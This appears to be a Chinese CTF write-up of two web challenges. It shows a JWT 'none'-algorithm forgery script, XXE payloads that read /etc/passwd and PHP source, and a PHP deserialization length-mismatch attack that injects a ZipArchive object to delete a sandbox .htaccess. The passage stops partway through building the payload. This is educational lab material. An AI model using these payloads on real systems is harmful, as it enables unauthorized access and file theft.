[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t0169b99cb08fa3fe6c.png)

考点：JWT攻击、XXE

题目打开，显示`hello guest;`

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t014294cb1d48e25472.png)

猜测应该是用户身份伪造，查看Cookie

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01080fa13cb460294b.png)

从Cookie中的token格式可以看出来是通过JWT进行身份验证的

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01098f86692164ab8e.png)

jwt解码可以看到Head里面的签名算法和payload里面的用户验证id，下来就是要绕过用户guest，达到任意用户身份伪造。

一般常见的JWT攻击手法主要包括四种：
- 算法修改
- 密钥可控
- 密钥爆破
- None签名
知道了上面的四种攻击手法之后，先对网站进行敏感信息探测是否存在密钥key泄露问题（【X】未果）,接着尝试对上面的token进行密钥的爆破，使用常用的jwt弱密钥爆破工具[c-jwt-cracker: JWT brute force cracker written in C](https://github.com/brendan-rius/c-jwt-cracker)进行爆破

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t015084e46eec69e0a9.png)

很长时间没爆出来，发现无效，尝试制作相关的弱口令字典

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01aaad94cda348b563.png)

使用自制字典利用工具[JWTPyCrack](https://github.com/Ch1ngg/JWTPyCrack)协助再次进行爆破（结果总是令人伤感的23333）

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t0135a83a60352c1caf.png)

测试到这里只有最后一种攻击手法了，利用很简单，直接伪造任意用户id，并使用None签名算法进行伪造Token。

根据题目描述只有用户`user`才有权限进行后续的操作，于是对用户`user`进行身份伪造

伪造脚本

```
import jwt
token = jwt.encode(`{`"id":"user","iat":"1588902740", "jti": "cd811589c43d3d507c64b14a6f64e8d8"`}`,algorithm="none",key="").decode(encoding='utf-8')
print(token)
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0176fa15061c5ee800.png)

（在这里，细心的话会发现JWT的第三部分是空的，因为签名算法为None，密钥Key为空）

利用生成伪造的user身份的Token替换原有Token进行伪造用户验证

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t01d71fc7bc1064f211.png)

伪造的用户user通过验证，进入用户登录界面，查看源码，发现存在用户名和密码通过XML进行处理

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t015c00d72b01678322.png)

直接抓包进行XXE漏洞的探测，构造XXE Payload进行敏感文件的读取

```
&lt;!DOCTYPE message [
    &lt;!ENTITY file SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;66666&lt;/password&gt;&lt;/user&gt;
```

利用payload探测发现内容读取的文件正常回显，并且没有对用户的输入进行过滤

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01816556dc99a6bdc4.png)

既然存在XXE漏洞且不存在过滤，尝试读取源码doLogin.php

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01e8afe4481e2cc428.png)

从结果分析，存在xxe漏洞为什么读取不了呢，这里就需要注意了，php文件的格式`&lt;?php ?&gt;`类似XML文件`&lt;?xml ?&gt;`，如果不做处理直接读取是读不出来的，因为其会把php文件当作xml进行解析导致读取出现问题，既然这样可以使用`php://filter`对文件进行base64编码再显示，这样就不会出现上述问题

再次构造Payload

```
&lt;!DOCTYPE message [
    &lt;!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=doLogin.php"&gt;
]&gt;
&lt;user&gt;&lt;username&gt;&amp;file;&lt;/username&gt;&lt;password&gt;66666&lt;/password&gt;&lt;/user&gt;
```

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011ffe7fcca469be0e.png)

可以看到这次结果正常，提取编码后的结果进行base64解码

[![](https://p4.ssl.qhimg.com/t01fad674568e780f1e.png)](https://p4.ssl.qhimg.com/t01fad674568e780f1e.png)

从源码中可以看到包含有flag.php，利用上述payload直接读取得到flag

[![](https://p1.ssl.qhimg.com/t0148eb5b756c09dc0e.png)](https://p1.ssl.qhimg.com/t0148eb5b756c09dc0e.png)

```
flag`{`get_the_methodd`}`
```

**附题目源码**
- index.php
```
&lt;?php
include("jwt_debug_none.php");
$jwt=new Jwt();
if(!isset($_COOKIE['token']))`{`
    $ip=$_SERVER['REMOTE_ADDR'];
    $payload=array('id'=&gt;'guest','iat'=&gt;time(),'jti'=&gt;md5(uniqid($ip).time()));
    $cookie=$jwt-&gt;getToken($payload);
    setcookie('token',$cookie);
`}`

$cookie=$_COOKIE['token'];
$identity='guest';

if($jwt-&gt;verifyToken($cookie))`{`
    $identity=$jwt-&gt;getidentity();
`}`
else`{`
    $identity='guest';
`}`
$allowedPages = array(
    'guest'     =&gt; './in.html',
    'user'    =&gt; './login_for_user.html',
);
include(isset($allowedPages[$identity]) ? $allowedPages[$identity] : $allowedPages["guest"]);
```
- doLogin.php
```
&lt;?php
include("jwt_debug_none.php");
include("flag.php");

$ip=$_SERVER['REMOTE_ADDR'];
$jwt=new Jwt();

$USERNAME = 'adm_in'; //账号
$result = null;

libxml_disable_entity_loader(false);
$xmlfile = file_get_contents('php://input');

try`{`
$dom = new DOMDocument();
$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
//echo var_dump($dom);
$creds = simplexml_import_dom($dom);

$username = $creds-&gt;username;
$password = $creds-&gt;password;

if($username == $USERNAME &amp;&amp; $password == $PASSWORD)`{`
$result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;",1,$username);
//if not null
`}`else`{`
`}`$result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;",0,$username);

`}`catch(Exception $e)`{`
$result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;",3,$e-&gt;getMessage());
`}`

header('Content-Type: text/html; charset=utf-8');
echo $result;
?&gt;
```

### <a class="reference-link" name="%E6%9C%AA%E7%9F%A5%E7%9A%84%E9%A3%8E%E9%99%A9-2"></a>未知的风险-2

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t017698493694005e1c.png)

考点：PHP对象注入、代码审计、序列化

题目上来给了一个文件上传的服务，没有直接去测试，对网站进行敏感信息收集，发现存在`robots.txt`泄露

```
User-agent: *
Disallow: /index.txt
```

访问`index.txt`获取网站源码

```
&lt;?php

include('secret.php');

$sandbox_dir = 'sandbox/'.sha1($_SERVER['REMOTE_ADDR']);
global $sandbox_dir;

function myserialize($a, $secret) `{`
    $b = str_replace("../","./", serialize($a));
    return $b.hash_hmac('sha256', $b, $secret);
`}`

function myunserialize($a, $secret) `{`
    if(substr($a, -64) === hash_hmac('sha256', substr($a, 0, -64), $secret))`{`
        return unserialize(substr($a, 0, -64));
    `}`
`}`

class UploadFile `{`

    function upload($fakename, $content) `{`
        global $sandbox_dir;
        $info = pathinfo($fakename);
        $ext = isset($info['extension']) ? ".".$info['extension'] : '.txt';
        file_put_contents($sandbox_dir.'/'.sha1($content).$ext, $content);
        $this-&gt;fakename = $fakename;
        $this-&gt;realname = sha1($content).$ext;
    `}`
    function open($fakename, $realname) `{`
        global $sandbox_dir;
        $analysis = "$fakename is in folder $sandbox_dir/$realname.";
        return $analysis;
    `}`
`}`

if(!is_dir($sandbox_dir)) `{`
    mkdir($sandbox_dir,0777,true);
`}`

if(!is_file($sandbox_dir.'/.htaccess')) `{`
    file_put_contents($sandbox_dir.'/.htaccess', "php_flag engine off");
`}`

if(!isset($_GET['action'])) `{`
    $_GET['action'] = 'home';
`}`


if(!isset($_COOKIE['files'])) `{`
    setcookie('files', myserialize([], $secret));
    $_COOKIE['files'] = myserialize([], $secret);
`}`


switch($_GET['action'])`{`
    case 'home':
    default:
        $content = "&lt;form method='post' action='index.php?action=upload' enctype='multipart/form-data'&gt;&lt;input type='file' name='file'&gt;&lt;input type='submit'/&gt;&lt;/form&gt;";

        $files = myunserialize($_COOKIE['files'], $secret);
        if($files) `{`
            $content .= "&lt;ul&gt;";
            $i = 0;
            foreach($files as $file) `{`
                $content .= "&lt;li&gt;&lt;form method='POST' action='index.php?action=changename&amp;i=".$i."'&gt;&lt;input type='text' name='newname' value='".htmlspecialchars($file-&gt;fakename)."'&gt;&lt;input type='submit' value='Click to edit name'&gt;&lt;/form&gt;&lt;a href='index.php?action=open&amp;i=".$i."' target='_blank'&gt;Click to show locations&lt;/a&gt;&lt;/li&gt;";
                $i++;
            `}`
            $content .= "&lt;/ul&gt;";
        `}`
        echo $content;
        break;
    case 'upload':
        if($_SERVER['REQUEST_METHOD'] === "POST") `{`
            if(isset($_FILES['file'])) `{`
                $uploadfile = new UploadFile;
                $uploadfile-&gt;upload($_FILES['file']['name'], file_get_contents($_FILES['file']['tmp_name']));
                $files = myunserialize($_COOKIE['files'], $secret);
                $files[] = $uploadfile;
                setcookie('files', myserialize($files, $secret));
                header("Location: index.php?action=home");
                exit;
            `}`
        `}`
        break;
    case 'changename':
        if($_SERVER['REQUEST_METHOD'] === "POST") `{`
            $files = myunserialize($_COOKIE['files'], $secret);
            if(isset($files[$_GET['i']]) &amp;&amp; isset($_POST['newname']))`{`
                $files[$_GET['i']]-&gt;fakename = $_POST['newname'];
            `}`
            setcookie('files', myserialize($files, $secret));
        `}`
        header("Location: index.php?action=home");
        exit;
    case 'open':
        $files = myunserialize($_COOKIE['files'], $secret);
        if(isset($files[$_GET['i']]))`{`
            echo $files[$_GET['i']]-&gt;open($files[$_GET['i']]-&gt;fakename, $files[$_GET['i']]-&gt;realname);
        `}`
        exit;
    case 'reset':
        setcookie('files', myserialize([], $secret));
        $_COOKIE['files'] = myserialize([], $secret);
        array_map('unlink', glob("$sandbox_dir/*"));
        header("Location: index.php?action=home");
        exit;
`}`
```

查看源码，发现该题目基本类似于[Insomnihack Teaser 2018](https://link.jianshu.com/?t=https%3A%2F%2Fcorb3nik.github.io%2Fblog%2Finsomnihack-teaser-2018%2Ffile-vault)

该题是一个沙盒文件管理器，允许用户上传文件，同时还允许查看文件的元数据。

文件上传通过cookie来保存上传的文件信息。$_COOKIE[‘files’]的值是个反序列化的数组，数组的每个元素是一个UploadFile对象，保存了一个fakename（上传文件的原始名字，可以修改）和一个realname（内容hash值）。

用户可以进行下面五类操作：
- 主页/home: （查看主页）通过反序列化cookie的值获得上传文件列表，然后显示在前端页面
```
case 'home':
    default:
        $content = "&lt;form method='post' action='index.php?action=upload' enctype='multipart/form-data'&gt;&lt;input type='file' name='file'&gt;&lt;input type='submit'/&gt;&lt;/form&gt;";

        $files = myunserialize($_COOKIE['files'], $secret);
        if($files) `{`
            $content .= "&lt;ul&gt;";
            $i = 0;
            foreach($files as $file) `{`
                $content .= "&lt;li&gt;&lt;form method='POST' action='index.php?action=changename&amp;i=".$i."'&gt;&lt;input type='text' name='newname' value='".htmlspecialchars($file-&gt;fakename)."'&gt;&lt;input type='submit' value='Click to edit name'&gt;&lt;/form&gt;&lt;a href='index.php?action=open&amp;i=".$i."' target='_blank'&gt;Click to show locations&lt;/a&gt;&lt;/li&gt;";
                $i++;
            `}`
            $content .= "&lt;/ul&gt;";
        `}`
        echo $content;
        break;
```

默认显示上传界面，随后反序列化Cookie存储`files`数组的`UploadFile`对象，遍历显示上传的文件。
- 上传/upload: （上传新文件）创建对象`UploadFile`保存上传文件，无过滤
```
case 'upload':
        if($_SERVER['REQUEST_METHOD'] === "POST") `{`
            if(isset($_FILES['file'])) `{`
                $uploadfile = new UploadFile;
                $uploadfile-&gt;upload($_FILES['file']['name'], file_get_contents($_FILES['file']['tmp_name']));
                $files = myunserialize($_COOKIE['files'], $secret);
                $files[] = $uploadfile;
                setcookie('files', myserialize($files, $secret));
                header("Location: index.php?action=home");
                exit;
            `}`
        `}`
        break;
```

创建`UploadFile`对象，调用`upload`方法，传入文件名、文件内容在服务器上进行存储，然后反序列化cookie的files对新创建的文件`uploadfile`对象进行追加存储，之后重新设置cookie重新序列化files。

```
class UploadFile `{`

    function upload($fakename, $content) `{`
        global $sandbox_dir;
        $info = pathinfo($fakename);
        $ext = isset($info['extension']) ? ".".$info['extension'] : '.txt';
        file_put_contents($sandbox_dir.'/'.sha1($content).$ext, $content);
        $this-&gt;fakename = $fakename;
        $this-&gt;realname = sha1($content).$ext;
    `}`
    function open($fakename, $realname) `{`
        global $sandbox_dir;
        $analysis = "$fakename is in folder $sandbox_dir/$realname.";
        return $analysis;
    `}`
`}`
```
- 更改名称/changename:（重命名已上传的文件）修改某个已上传文件的fakename，然后重新序列化
```
case 'changename':
        if($_SERVER['REQUEST_METHOD'] === "POST") `{`
            $files = myunserialize($_COOKIE['files'], $secret);
            if(isset($files[$_GET['i']]) &amp;&amp; isset($_POST['newname']))`{`
                $files[$_GET['i']]-&gt;fakename = $_POST['newname'];
            `}`
            setcookie('files', myserialize($files, $secret));
        `}`
        header("Location: index.php?action=home");
        exit;
```

根据`i`值索引文件对象`UploadFile`，然后更改`fakename`的值，之后重新设置cookie重新序列化files。
- 打开/open: （查看已上传文件的元数据）输出指定文件的fakename和realname信息
```
case 'open':
        $files = myunserialize($_COOKIE['files'], $secret);
        if(isset($files[$_GET['i']]))`{`
            echo $files[$_GET['i']]-&gt;open($files[$_GET['i']]-&gt;fakename, $files[$_GET['i']]-&gt;realname);
        `}`
        exit;
```

通过`i`值索引文件对象`UploadFile`，然后调用对象的`open`方法输出指定文件的元数据：`fakename和realname`信息。
- 重置/reset: （删除特定沙盒中的所文件）清空特定的sandbox
```
case 'reset':
        setcookie('files', myserialize([], $secret));
        $_COOKIE['files'] = myserialize([], $secret);
        array_map('unlink', glob("$sandbox_dir/*"));
        header("Location: index.php?action=home");
        exit;
```

通过空数组设置新的cookie，然后删除`$sandbox_dir/`下的文件。

对于用户的操作，其中的每一个操作，都是在沙盒环境中执行的。这里的沙盒，是程序生成的用户专属文件夹，其生成代码如下：

```
$sandbox_dir = 'sandbox/'.sha1($_SERVER['REMOTE_ADDR']);
```

该沙盒还可以防止PHP执行，以生成的.htaccess文件为例，我们可以看到其中的php_flag engine off指令：

```
if(!is_dir($sandbox_dir)) `{`
    mkdir($sandbox_dir,0777,true);
`}`

if(!is_file($sandbox_dir.'/.htaccess')) `{`
    file_put_contents($sandbox_dir.'/.htaccess', "php_flag engine off");
`}`
```

针对`UploadFile`类，在上传新文件时，将使用以下属性来创建UploadFile：

fakename：用户上传文件的原始文件名；

realname：自动生成的文件名，用于在磁盘上存储文件。

通过Open操作查看文件时，fakename用于文件名的显示，而在文件系统中所保存的文件，实际上其文件名为realname中的名称。

然后，会将UploadFile对象添加到数组，通过自定义的myserialize()函数对其进行序列化，并通过文件Cookie返回给用户。当用户想要查看文件时，Web应用程序会获取用户的Cookie，通过myunserialized()函数对UploadFile对象的数组反序列化，随后对其进行相应的处理。

下面是UploadFile对象的示例：

```
a:2:`{`i:0;O:10:"UploadFile":2:`{`s:8:"fakename";s:9:"pictu.jpg";s:8:"realname";s:44:"3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg";`}`i:1;O:10:"UploadFile":2:`{`s:8:"fakename";s:7:"qwe.jpg";s:8:"realname";s:44:"75a9c6a2fcb5d7c6809ec7c1a5859a7f83637159.jpg";`}``}`f96f37cca80ecae3c5f2f30be497c27024a23a24093e9e7a26c9721be025fb7b
```

以下是用于生成上述序列化对象的相关代码：

```
function myserialize($a, $secret) `{`
    $b = str_replace("../","./", serialize($a));
    return $b.hash_hmac('sha256', $b, $secret);
`}`

function myunserialize($a, $secret) `{`
    if(substr($a, -64) === hash_hmac('sha256', substr($a, 0, -64), $secret))`{`
        return unserialize(substr($a, 0, -64));
    `}`
`}`

class UploadFile `{`

    function upload($fakename, $content) `{`
        global $sandbox_dir;
        $info = pathinfo($fakename);
        $ext = isset($info['extension']) ? ".".$info['extension'] : '.txt';
        file_put_contents($sandbox_dir.'/'.sha1($content).$ext, $content);
        $this-&gt;fakename = $fakename;
        $this-&gt;realname = sha1($content).$ext;
    `}`
    function open($fakename, $realname) `{`
        global $sandbox_dir;
        $analysis = "$fakename is in folder $sandbox_dir/$realname.";
        return $analysis;
    `}`
`}`

switch($_GET['action'])`{`
    case 'open':
        $files = myunserialize($_COOKIE['files'], $secret);
        if(isset($files[$_GET['i']]))`{`
            echo $files[$_GET['i']]-&gt;open($files[$_GET['i']]-&gt;fakename, $files[$_GET['i']]-&gt;realname);
        `}`
        exit;
`}`
```

因为每次建立sandbox的时候，都会在目录加上一个`.htaccess`文件来限制php的执行，因此我们无法直接上传shell。同时由于在序列化和反序列化的时候做了签名，我们也不能直接通过修改cookie的方式来改变对象。

由于源代码中没有wakeup()或destruct()这样的magic函数，因此我们不能使用常用的一些反序列化攻击方法。

**发现漏洞：破坏序列化对象**

随着继续的审计和探索，发现应用程序中的漏洞：

```
function myserialize($a, $secret) `{`
    $b = str_replace("../","./", serialize($a));
    return $b.hash_hmac('sha256', $b, $secret);
`}`

function myunserialize($a, $secret) `{`
    if(substr($a, -64) === hash_hmac('sha256', substr($a, 0, -64), $secret))`{`
        return unserialize(substr($a, 0, -64));
    `}`
`}`
```

代码的作者添加了一个`str_replace()`调用，用来过滤掉`../`序列。这就存在一个问题，`str_replace`调用是在一个序列化的对象上执行的，而不是一个字符串。

比如有这么一个序列化后的字符串

```
php &gt; $array = array();
php &gt; $array[] = "../";
php &gt; $array[] = "hello";
php &gt; echo serialize($array);
a:2:`{`i:0;s:3:"../";i:1;s:5:"hello";`}`
```

在myserialize函数（`../过滤器`）处理后就变成了

```
php &gt; echo str_replace("../","./", serialize($array));
a:2:`{`i:0;s:3:"./";i:1;s:5:"hello";`}`
```

通过过滤，确实已经将`“../”`改为了`“./”`，然而，序列化字符串的大小并没有改变。`s:3:”./“;`显示的字符串大小为3，然而实际上它的大小是2！!

当这个损坏的对象被unserialize()处理时，PHP会将序列化对象(`“`)中的下一个字符视为其值的一部分，而从这之后，反序列化就会出错：

```
a:2:`{`i:0;s:3:"./";i:1;s:5:"hello";`}`
           ^  --- &lt;== The value parsed by unserialize() is ./"

```

**伪造任意对象并签名**

既然这样，那么如果合理控制../的数量，是不是就可以引入一个非法的对象呢

```
php &gt; $array = array();
php &gt; $array[] = "../../../../../../../../../../../../../";
php &gt; $array[] = 'A";i:1;s:8:"Injected';
php &gt; echo serialize($array);
a:2:`{`i:0;s:39:"../../../../../../../../../../../../../";i:1;s:20:"A";i:1;s:8:"Injected";`}`
```

对于这个序列化的字符串，处理以后为：

```
php &gt; $x = str_replace("../", "./", serialize($array));
php &gt; echo $x;
a:2:`{`i:0;s:39:"./././././././././././././";i:1;s:20:"A";i:1;s:8:"Injected";`}`
               ---------------------------------------           --------

php &gt; print_r(unserialize($x));
Array
(
    [0] =&gt; ./././././././././././././";i:1;s:20:"A
    [1] =&gt; Injected
)
```

这个时候，s:39对应的字符串变成了`./././././././././././././";i:1;s:20:"A`，这样就把本来不应该有的Injected引入了进来。在这个例子中，使用的字符串是“i:1;s:8:”Injected”，但同样，任何基元/对象都可以在这里使用。

继续回到题目本身，情况与之几乎相同。我们需要的就是一个数组，该题中正是`UploadFile`对象数组，在这个数组中我们可以破坏第一个对象，从而控制第二个对象。

我们可以通过上传两个文件来实现漏洞的利用。就像上面的例子一样，我们具体操作如下：
- 上传两个文件，创建两个VaultFile对象；
- 用部分序列化的对象，重命名第二个UploadFile对象中的fakename；
- 借助`../`序列，重命名第一个UploadFile对象中的fakename，使其到达第二个UploadFile对象。
请注意，由于我们现在使用的是Web应用程序的正常功能来执行上述操作，所以就不用再考虑签名的问题，这些操作一定是合法的。

由于`myserialize`的问题，如果我们有一个可控点，就可以尝试引入非法的对象。这个可控点就是changename，changename会修改fakename的值同时重新序列化对象

**使用任意数据伪造序列化对象**

通过上面的探索，现在，就可以使用任意数据，来伪造我们自己的序列化对象。在这一步骤中，我们需要解决的是一个经典的对象注入问题，但在这里，并没有太多技巧或者捷径可以供我们使用。

到目前为止，我们几乎已经用到了应用中所有的功能，但还有一个没有用过，那就是Open。以下是Open的相关代码：

```
function open($fakename, $realname) `{`
        global $sandbox_dir;
        $analysis = "$fakename is in folder $sandbox_dir/$realname.";
        return $analysis;
    `}`

    case 'open':
        $files = myunserialize($_COOKIE['files'], $secret);
        if(isset($files[$_GET['i']]))`{`
            echo $files[$_GET['i']]-&gt;open($files[$_GET['i']]-&gt;fakename, $files[$_GET['i']]-&gt;realname);
        `}`
        exit;
```

Open操作通过`i`索引会从$files数组中获取一个对象，并使用$object-&gt;fakename和$object-&gt;realname这两个参数来调用open()函数。

通过上面知道，可以在$files数组中注入任何对象（就像之前注入的“Injected”字符串一样）。但如果我们注入的不是UploadFile对象，会发生什么？

其实可以看到，open()这一方法名是非常常见的。如果我们能够在PHP中找到一个带有open()方法的标准类，那么就可以欺骗Web应用去调用这个类的open()方法，而不再调用UploadFile中的方法。

简单来看可以理解为下面的实例过程

```
&lt;?php
$array = new array();
$array[] = new UploadFile();
$array[0]-&gt;open($array[0]-&gt;fakename, $array[0]-&gt;realname);
```

可以通过欺骗Web应用程序，来实现这一点，从而实现类的欺骗，调用其它类的相同方法：

```
&lt;?php
$array = new array();
$array[] = new SomeOtherFile();
$array[0]-&gt;open($array[0]-&gt;fakename, $array[0]-&gt;realname);
```

既然可以这样操作那么下来就是要寻找有那些类包含open()方法，从而实现后续的利用

通过原WP，编写代码列出所有包含open()方法的类：

```
$ cat list.php
&lt;?php
  foreach (get_declared_classes() as $class) `{`
    foreach (get_class_methods($class) as $method) `{`
      if ($method == "open")
        echo "$class-&gt;$methodn";
    `}`
  `}`
?&gt;
```

列举结果：

```
$ php list.php
SQLite3-&gt;open
SessionHandler-&gt;open
XMLReader-&gt;open
ZipArchive-&gt;open
```

经过寻找，共发现有4个类带有open()方法。如果在$files数组中，注入这些类中任意一个的序列化对象，我们就可以通过带有特定参数的open动作，来调用这些类中的方法。

其中的大部分类都能够对文件进行操作。回到之前，我们知道`.htaccess`会在沙盒中阻止我们执行PHP。所以，假如能通过某种方式删掉`.htaccess`文件，那么就成功了。

通过对上面的4个类进行测试，发现，ZipArchive-&gt;open方法可以删除目标文件，前提是我们需要将其第二个参数设定为“9”。

`ZipArchive::open`的第一个参数是文件名，第二个参数是flags，而9对应的是`ZipArchive::CREATE | ZipArchive::OVERWRITE`。`ZipArchive::OVERWRITE`的意思是重写覆盖文件，这个操作会删除原来的文件。

因为UploadFile类的open函数的参数是fakename和realname，fakename对应.htaccess，realname对应flags，这里直接使用`ZipArchive::OVERWRITE`的integer值9，这样我们就可以使用ZipArchive-&gt;open()来删除`.htaccess`文件。

**分析编写payload**

先序列化一个ZipArchive类的对象：

```
&lt;?php
$zip = new ZipArchive();
$zip-&gt;fakename = "sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess";
$zip-&gt;realname = "9";
echo serialize($zip);

O:10:"ZipArchive":7:`{`s:8:"fakename";s:58:"sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:0:"";`}`
```

然后随便上传两个文件，查看cookie得到序列化的值

```
a:2:`{`i:0;O:10:"UploadFile":2:`{`s:8:"fakename";s:9:"pictu.jpg";s:8:"realname";s:44:"3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg";`}`i:1;O:10:"UploadFile":2:`{`s:8:"fakename";s:7:"qwe.jpg";s:8:"realname";s:44:"75a9c6a2fcb5d7c6809ec7c1a5859a7f83637159.jpg";`}``}`f96f37cca80ecae3c5f2f30be497c27024a23a24093e9e7a26c9721be025fb7b
```

根据前面的探索利用，将第二个文件的fakename改成需要构造的ZipArchive的序列化值，如果想单独溢出注入ZipArchive对象，就需要将第二个文件对象中fakename值的前后部分都需要被溢出才行：
- 后面部分：
```
";s:8:"realname";s:44:"75a9c6a2fcb5d7c6809ec7c1a5859a7f83637159.jpg
```

67个无用字符，所以ZipArchive序列化对象中的comment的长度为67，部分构造如下：

```
i:1;O:10:"ZipArchive":7:`{`s:8:"fakename";s:58:"sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"

```
- 前面部分：
因为第一个文件对象中的fakename需要溢出到第二个文件的fakename值的位置，所以第二个文件对象的fakename值还需要加一部分：

```
";s:8:"realname";s:1:"A";`}`
```

PS：此处的realname内容是什么无所谓，主要是为了序列化的完整性

第二个文件对象最终的fakename值如下：

```
";s:8:"realname";s:1:"A";`}`i:1;O:10:"ZipArchive":7:`{`s:8:"fakename";s:58:"sandbox/ded5a68df70145b3a0bbe9c4290a729d37071e54/.htaccess";s:8:"realname";s:1:"9";s:6:"status";i:0;s:9:"statusSys";i:0;s:8:"numFiles";i:0;s:8:"filename";s:0:"";s:7:"comment";s:67:"
```

处理完第二个文件对象的fakename就需要处理第一个文件对象的fakename：

同时，要想ZipArchive对象成功溢出，就需要从第一个文件对象fakename值溢出到第二个文件对象的fakename值，所以第一个fakename值需要溢出的部分为：

```
";s:8:"realname";s:44:"3c4578834eed3f05bd8b099e7fc2c633af6c5fdc.jpg";`}`i:1;O:10:"UploadFile":2:`{`s:8:"fakename";s:7:"
```

可是这样是不正确的，正确部分的应该是：

```
